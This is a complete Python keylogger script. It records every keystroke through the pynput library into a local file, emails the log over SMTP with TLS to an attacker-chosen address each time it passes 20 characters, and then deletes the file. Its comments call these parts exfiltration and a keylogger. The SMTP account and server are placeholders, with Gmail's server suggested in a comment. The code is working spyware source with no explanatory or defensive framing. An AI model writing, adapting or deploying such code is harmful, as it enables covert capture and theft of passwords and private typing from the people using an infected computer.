import pynput.keyboard
import smtplib
import datetime
import ssl
from email.message import EmailMessage 
import os

# smtp email exfiltration
def xfil_log():
    with open("fakelog.txt", 'r') as f:
        body = f.read()
        sendUser = "email here"
        password = "password here // app password"

        email = EmailMessage()
        email['From'] = sendUser
        email['To'] = sendUser
        email['subject'] = str(datetime.datetime.now()) + " keylog."
        email.set_content(body)
    context = ssl.create_default_context()
    with smtplib.SMTP('smtp server here', 'port here') as smtp: #otherwise use smtp.gmail.com::587
        smtp.starttls(context=context)
        smtp.login(sendUser, password)
        smtp.sendmail(sendUser, sendUser, email.as_string())
    os.remove("fakelog.txt")

# keylogger
def keypress(key):
    with open("fakelog.txt", 'a') as logkeyfirmware:
        with open("fakelog.txt", 'r') as f:
            badlog = f.read()
        if len(badlog) > 20:
            xfil_log()
        try:
            if key == pynput.keyboard.Key.enter:
                logkeyfirmware.write("\n")
            elif key == pynput.keyboard.Key.tab:
                logkeyfirmware.write("\t")
            elif key == pynput.keyboard.Key.space:
                logkeyfirmware.write(" ")
            elif key == pynput.keyboard.Key.backspace:
                logkeyfirmware.write("[bspace]")
            else:
                logkeyfirmware.write(key.char)
        except:
            pass

if __name__ == '__main__':
    while(True):
        listener = pynput.keyboard.Listener(on_press=keypress)
        listener.start()
        listener.join()
    xfil_log()
